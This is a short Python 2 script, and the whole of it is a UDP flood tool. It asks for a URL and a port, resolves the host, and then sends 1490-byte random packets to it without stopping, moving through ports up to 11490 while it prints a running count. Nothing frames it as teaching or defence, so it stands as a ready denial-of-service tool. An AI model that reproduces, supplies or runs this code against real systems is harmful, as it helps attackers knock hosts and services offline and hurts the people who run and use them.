import random,os,socket,sys,time
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
by=random._urandom(1490)

url=raw_input("enter the url :")
port=input("port =>  ")
ip=socket.gethostbyname(url)
time.sleep(3)
sent=0
while True:
    sock.sendto(by, (ip,port))
    sent=sent+1
    port=port+1
    print "Sent %s packet to %s port %s"%(sent,ip,port)
    if port==11490:
        port=1
